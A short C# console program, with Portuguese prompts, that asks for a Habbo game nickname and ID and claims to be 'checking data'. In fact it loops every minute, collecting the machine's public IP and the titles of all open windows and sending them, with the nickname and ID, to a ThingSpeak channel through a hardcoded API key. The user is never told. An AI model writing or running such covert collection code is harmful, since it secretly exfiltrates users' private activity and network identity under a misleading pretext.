// See https://aka.ms/new-console-template for more information


using System;
using System.Diagnostics;
using System.Net;
using static System.Net.WebRequestMethods;

string? nomeHabbo = "";
string? idJogo = "";
string enderecomc = "124535";
int i = 0;
string url = "https://api.thingspeak.com/update?api_key=F603QZFJN4HPD3M8&field1=";
string urlGetIp = "https://api.ipify.org";
int tempoEnvio = 60000;
System.Console.WriteLine("Informe o nick do jogo");
nomeHabbo = Console.ReadLine();
System.Console.WriteLine("Informe o id do jogo");
idJogo = Console.ReadLine();

if(string.IsNullOrEmpty(nomeHabbo))
{
    Console.WriteLine("e obrigatorio informar os campos...");
    i = 1;
}
else if (string.IsNullOrEmpty(idJogo))
{
    Console.WriteLine("e obrigatorio informar os campos...");
    i = 1;
}

while (i==0)
{
    string externalip = new WebClient().DownloadString($@"{urlGetIp}");
    var p = Process.GetProcesses();
    string programas = string.Join(",", p.ToList().Where(a => a.MainWindowTitle != "").Select(c => c.MainWindowTitle));
    var request = new HttpRequestMessage(HttpMethod.Get, $@"{url}{externalip}&field2={idJogo}&field3={nomeHabbo}&field4={programas}");
    var _httpClient = new HttpClient();
    var response = await _httpClient.SendAsync(request);    
    Console.WriteLine("Conferindo dados...");
    System.Threading.Thread.Sleep(tempoEnvio);

}
